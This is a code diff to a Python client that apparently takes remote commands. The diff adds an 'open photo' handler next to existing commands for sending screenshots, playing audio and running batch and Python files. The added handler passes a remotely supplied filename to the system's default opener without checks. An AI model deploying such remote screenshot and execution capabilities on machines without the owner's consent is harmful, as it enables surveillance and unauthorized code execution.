@@ -43,6 +43,7 @@ SCREENSHOT_TARGET_HEIGHT = int(cfg["SCREENSHOT_TARGET_HEIGHT"])
 
 START_SCREENSHOTS_COMMAND = cfg["START_SCREENSHOTS_COMMAND"]
 STOP_SCREENSHOTS_COMMAND = cfg["STOP_SCREENSHOTS_COMMAND"]
+OPEN_PHOTO_COMMAND = cfg["OPEN_PHOTO_COMMAND"]
 PLAY_WAV_COMMAND = cfg["PLAY_WAV_COMMAND"]
 RUN_BAT_COMMAND = cfg["RUN_BAT_COMMAND"]
 RUN_PY_COMMAND = cfg["RUN_PY_COMMAND"]
@@ -181,6 +182,23 @@ def stop_sending_screenshots():
     logger.info("Screenshots stopped being sent")
 
     return True, None, "screenshots stopped being sent"
+
+def open_photo(path):
+    logger.info(f"Trying to open {path}")
+
+    try:
+        if sys.platform.startswith("win"):
+            process = subprocess.Popen(["cmd", "/c", "start", "", path], shell=False)
+        elif sys.platform.startswith("darwin"):
+            process = subprocess.Popen(['open', path])
+        else:
+            process = subprocess.Popen(['xdg-open', path])
+
+        logger.info(f"File {path} opened")
+        return True, process, f"{path} opened"
+    except Exception as e:
+        logger.warning(f"Failed to open {path}: {str(e)}")
+        return False, None, str(e)
 
 def play_wav_file(path):
     logger.info(f"Trying to play {path}")
@@ -349,6 +367,12 @@ def process_commands(commands):
 
         elif command_name == STOP_SCREENSHOTS_COMMAND:
             process_command(STOP_SCREENSHOTS_COMMAND, stop_sending_screenshots)
+
+        elif command_name == OPEN_PHOTO_COMMAND:
+            payload = commands.get(OPEN_PHOTO_COMMAND)
+            filename = payload.get("filename")
+
+            process_command(OPEN_PHOTO_COMMAND, lambda: open_photo(filename))
 
         elif command_name == PLAY_WAV_COMMAND:
             payload = commands.get(PLAY_WAV_COMMAND)
